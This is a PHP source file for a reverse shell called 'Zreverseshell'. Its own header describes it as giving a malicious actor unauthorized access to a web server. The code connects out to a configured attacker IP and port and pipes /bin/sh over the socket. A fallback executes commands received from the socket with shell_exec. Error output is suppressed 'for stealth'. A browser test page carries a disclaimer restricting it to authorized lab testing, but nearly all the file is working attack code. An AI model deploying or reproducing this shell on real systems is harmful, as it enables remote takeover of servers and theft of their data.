<?php
/*
 Zreverseshell is a reverse shell that makes the target system listen a shell on a configured port once ran on a web server. Then it displays the shell session on the PHP giving the malicious actor unauthorized access to the target system.
    Copyright (C) 2025 Gage singleton <zeroday0x00@disroot.org>

    This program is free software: you can redistribute it and/or modify
    it under the terms of the GNU General Public License as published by
    the Free Software Foundation, either version 3 of the License, or
    (at your option) any later version.

    This program is distributed in the hope that it will be useful,
    but WITHOUT ANY WARRANTY; without even the implied warranty of
    MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
    GNU General Public License for more details.

    You should have received a copy of the GNU General Public License
    along with this program.  If not, see <https://www.gnu.org/licenses/>.
*/

// Configuration - Set these values before use
$host = '127.0.0.1'; // attacker's IP
$port = 4444;  // attackers port
$shell = '/bin/sh';   // Shell to use (adjust for Windows if needed)

// Error reporting - disable for stealth
error_reporting(0);

// Main reverse shell function
function reverse_shell($host, $port, $shell) {
error_log("Attempting to connect to $host:$port"); // Debugging line

// Create socket
$sock = @fsockopen($host, $port, $errno, $errstr, 30);
error_log("Socket connection result: $errno - $errstr"); // Debugging line
    
    if (!$sock) {
        return false;
    }

    // Set non-blocking mode
    stream_set_blocking($sock, 0);
    
    // Spawn shell process
    $descriptorspec = array(
        0 => array("pipe", "r"),  // stdin
        1 => array("pipe", "w"),  // stdout
        2 => array("pipe", "w")   // stderr
    );
    
    $process = @proc_open($shell, $descriptorspec, $pipes);
    
    if (!is_resource($process)) {
        fclose($sock);
        return false;
    }
    
    // Set non-blocking mode for pipes
    stream_set_blocking($pipes[0], 0);
    stream_set_blocking($pipes[1], 0);
    stream_set_blocking($pipes[2], 0);
    stream_set_blocking($sock, 0);
    
    // Main loop - handle I/O between socket and shell
    while (true) {
        // Check if shell process is still running
        $status = proc_get_status($process);
        if (!$status['running']) {
            break;
        }
        
        // Read from socket and write to shell stdin
        $read = array($sock);
        $write = null;
        $except = null;
        
        if (@stream_select($read, $write, $except, 0, 50000)) {
            $input = fread($sock, 4096);
            if ($input !== false && strlen($input) > 0) {
                fwrite($pipes[0], $input);
            }
        }
        
        // Read from shell stdout and write to socket
        $read = array($pipes[1]);
        if (@stream_select($read, $write, $except, 0, 50000)) {
            $output = fread($pipes[1], 4096);
            if ($output !== false && strlen($output) > 0) {
                fwrite($sock, $output);
            }
        }
        
        // Read from shell stderr and write to socket
        $read = array($pipes[2]);
        if (@stream_select($read, $write, $except, 0, 50000)) {
            $error = fread($pipes[2], 4096);
            if ($error !== false && strlen($error) > 0) {
                fwrite($sock, $error);
            }
        }
        
        // Small delay to prevent CPU overload
        usleep(10000);
    }
    
    // Cleanup
    fclose($sock);
    fclose($pipes[0]);
    fclose($pipes[1]);
    fclose($pipes[2]);
    proc_close($process);
    
    return true;
}

// Alternative simpler implementation for systems without proc_open
function simple_reverse_shell($host, $port) {
    $sock = @fsockopen($host, $port, $errno, $errstr, 30);
    
    if (!$sock) {
        return false;
    }
    
    // Execute shell commands received from socket
    while (!feof($sock)) {
        $command = fgets($sock);
        if ($command === false) {
            break;
        }
        
        $output = shell_exec(trim($command));
        if ($output === null) {
            $output = "Command execution failed or produced no output\n";
        }
        
        fwrite($sock, $output);
    }
    
    fclose($sock);
    return true;
}

// Test mode - check if we're running in a browser
if (php_sapi_name() === 'cli') {
    // Command line execution - run the actual reverse shell
    try {
        // Try the advanced method first
        if (!reverse_shell($host, $port, $shell)) {
            // Fallback to simple method
            simple_reverse_shell($host, $port);
        }
    } catch (Exception $e) {
        // Silent failure for stealth
    }
} else {
    // Browser execution - show test interface
    echo '<!DOCTYPE html>
    <html>
    <head>
        <title>Zrevshell Test Interface</title>
        <style>
            body { font-family: Arial, sans-serif; margin: 40px; background: #f5f5f5; }
            .container { max-width: 800px; margin: 0 auto; background: white; padding: 20px; border-radius: 8px; box-shadow: 0 2px 10px rgba(0,0,0,0.1); }
            h1 { color: #333; border-bottom: 2px solid #007bff; padding-bottom: 10px; }
            .warning { background: #fff3cd; border: 1px solid #ffeaa7; color: #856404; padding: 15px; border-radius: 5px; margin: 20px 0; }
            .config { background: #e9ecef; padding: 15px; border-radius: 5px; margin: 15px 0; }
            .test-btn { background: #007bff; color: white; border: none; padding: 10px 20px; border-radius: 5px; cursor: pointer; margin: 10px 5px; }
            .test-btn:hover { background: #0056b3; }
            .output { background: #f8f9fa; border: 1px solid #dee2e6; padding: 15px; border-radius: 5px; margin: 15px 0; font-family: monospace; }
        </style>
    </head>
    <body>
        <div class="container">
            <h1>Zrevshell Test Interface</h1>
            
            <div class="warning">
                <strong>⚠️ SECURITY DISCLAIMER:</strong> This tool is for educational and security testing purposes only. 
                Use only in controlled lab environments with proper authorization.
            </div>
            
            <div class="config">
                <h3>Current Configuration:</h3>
                <p><strong>Host:</strong> ' . htmlspecialchars($host) . '</p>
                <p><strong>Port:</strong> ' . htmlspecialchars($port) . '</p>
                <p><strong>Shell:</strong> ' . htmlspecialchars($shell) . '</p>
            </div>
            
            <h3>Test Functions:</h3>
            <button class="test-btn" onclick="testSocketConnection()">Test Socket Connection</button>
            <button class="test-btn" onclick="testShellExecution()">Test Shell Command Execution</button>
            <button class="test-btn" onclick="testProcOpen()">Test Process Opening</button>
            
            <div id="output" class="output">
                Test results will appear here...
            </div>
        </div>
        
        <script>
        function testSocketConnection() {
            document.getElementById("output").innerHTML = "Testing socket connection to ' . $host . ':' . $port . '...";
            
            // Simulate socket test (actual connection would be made in real usage)
            setTimeout(() => {
                document.getElementById("output").innerHTML = 
                    "Socket connection test completed.\\n" +
                    "In a real environment, this would attempt to connect to ' . $host . ':' . $port . '\\n" +
                    "Note: Browser PHP cannot make raw socket connections for security reasons.";
            }, 1000);
        }
        
        function testShellExecution() {
            document.getElementById("output").innerHTML = "Testing shell command execution...";
            
            // Use AJAX to test a simple command
            fetch(window.location.href + \'?test=shell\')
                .then(response => response.text())
                .then(data => {
                    document.getElementById("output").innerHTML = "Shell execution test:\\n" + data;
                });
        }
        
        function testProcOpen() {
            document.getElementById("output").innerHTML = "Testing process opening capabilities...";
            
            // Use AJAX to test proc_open
            fetch(window.location.href + \'?test=proc\')
                .then(response => response.text())
                .then(data => {
                    document.getElementById("output").innerHTML = "Process opening test:\\n" + data;
                });
        }
        </script>
    </body>
    </html>';
    
error_log("Received test request: " . json_encode($_GET)); // Debugging line

// Handle test requests
if (isset($_GET['test'])) {
    error_log("Test type: " . $_GET['test']); // Debugging line
    if ($_GET['test'] === 'shell') {
        // Test shell command execution
        $output = shell_exec('echo "Test command executed successfully - ' . date('Y-m-d H:i:s') . '"');
        echo $output ?: "Shell execution test completed (no output)";
    } elseif ($_GET['test'] === 'proc') {
        // Test proc_open availability
        if (function_exists('proc_open')) {
            echo "proc_open function is available on this system";
        } else {
            echo "proc_open function is NOT available - will use fallback method";
        }
    }
    exit;
}
}

?>
